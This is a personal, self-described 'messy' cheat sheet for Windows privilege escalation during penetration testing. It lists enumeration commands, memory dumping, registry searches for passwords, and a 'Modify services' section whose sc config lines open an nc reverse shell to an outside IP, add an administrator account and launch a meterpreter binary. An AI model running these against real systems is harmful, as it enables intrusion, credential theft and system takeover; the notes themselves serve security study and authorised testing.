---
description: Still messy
---

# Windows PE Methodology

## Automatic

Best tool to use is WinPeas, PowerUp.ps1 and PowerView.ps1 if needed. Generally, I run WinPEAS no matter what and then view information from there.&#x20;

## Manual

#### Check system information:

```
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

#### Check Networking information:

```
netstat -ano
ipconfig
netstat -a -b #view all services with listening ports
```

#### Check ENV Vars:

```
set
dir env:
Get-ChildItem Env: | ft key,value
```

#### Check PowerShell History:

```powershell
ConsoleHost_History
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Check Powershell Logging:

```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging

reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging

reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging

reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

#### Check Internet Settings:

```
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

#### Check the user that we are:

```
whoami 
whoami /priv
whoami /groups
net user <username>
net user <username> /domain # for AD
```

#### Check logged-on users:

```
qwinsta
klist sessions
```

#### Password Policy:

```
net accounts
```

#### Running Processes:

```
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

#### Check permissions of binaries:

```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z" 
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

#### Checking permissions of folders of binaries:

```
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
todos %username%" && echo.
)
```

#### Check memory of processes:

```
procdump.exe -accepteula -ma <process name>
```

#### Check services:

```
net start
wmic service list brief
sc query
Get-Service
```

#### Check privileges over these services:

```
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
```

#### Modify services:

```
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

#### Check files that we can write to:

```
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
accesschk.exe -uwdqs Users c:\
```

#### Check programs installed:

```
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Check AV:

```
cmd.exe /c "sc query windefend"

reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
```

Look for RDP access within machines itself. Sometimes exploits require RDP access to do.

#### Check Sticky notes:

```
dir /s #within user directory and find for .sqlite files
```

#### Checking password in Registry:

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
